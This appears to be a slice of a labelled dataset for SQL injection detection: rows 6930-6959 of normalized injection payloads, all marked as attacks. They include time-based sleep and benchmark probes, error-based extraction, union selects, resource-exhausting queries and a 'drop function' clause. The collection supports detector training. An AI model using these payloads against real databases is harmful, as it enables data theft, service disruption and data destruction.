row_index,payload_norm,label,sqli_type_hint
6930,select ( case when ( 5142 = 6855 ) then 5142 else 5142* ( select 5142 from mysql.db ) end ) #,1,
6931,select ( case when ( 9130 = 1826 ) then 9130 else 9130* ( select 9130 from mysql.db ) end ) #,1,
6932,"1' or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and 'ugum' like 'ugum",1,
6933,1%' ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( '%' = ',1,
6934,"1%' or elt ( 6272 = 6272,sleep ( 5 ) ) and '%' = '",1,
6935,"1%"" ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( ""%"" = """,1,
6936,1'+ ( select ksoh where 6339 = 6339,1,
6937,1 ) ) as pmff where 6649 = 6649,1,
6938,"1' ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) )",1,
6939,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) ||'",1,
6940,"1"" ) ) ) and 7135 = 8805#",1,
6941,"1"" ) ) as xcyo where 2929 = 2929",1,
6942,"-8600"" or elt ( 1032 = 1032,3623 ) and ""kfsn"" like ""kfsn",1,
6943,1' and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and 'gpax' = 'gpax,1,
6944,"select * from generate_series ( 6200,6200,case when ( 6200 = 5449 ) then 1 else 0 end ) limit 1--",1,
6945,"1' procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and 'gbpg' = 'gbpg",1,
6946,select ( case when ( 7169 = 7785 ) then 1 else 7169* ( select 7169 from master..sysdatabases ) end ) --,1,
6947,"1"" ) ) ) and sleep ( 5 ) and ( ( ( ""fdvc"" like ""fdvc",1,
6948,"1' where 1230 = 1230 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
6949,"select * from generate_series ( 9964,9964,case when ( 9964 = 4455 ) then 1 else 0 end ) limit 1--",1,
6950,select case when 6662 = 9889 then 1 else null end--,1,
6951,1 ) ) as xoch where 8765 = 8765 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --,1,
6952,select ( case when ( 6045 = 2786 ) then 6045 else 1/ ( select 0 ) end ) --,1,
6953,1' ) and 7533 = 7533 and ( 'cryr' = 'cryr,1,
6954,"1 ) and elt ( 3138 = 1817,1817 )",1,
6955,-2214' ) union all select 8228#,1,
6956,if ( 4194 = 4133 ) select 4194 else drop function tqhz--,1,
6957,"1 ) ) ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
6958,"1' ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( 'qtfl' = 'qtfl",1,
6959,"1 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) # kfza",1,
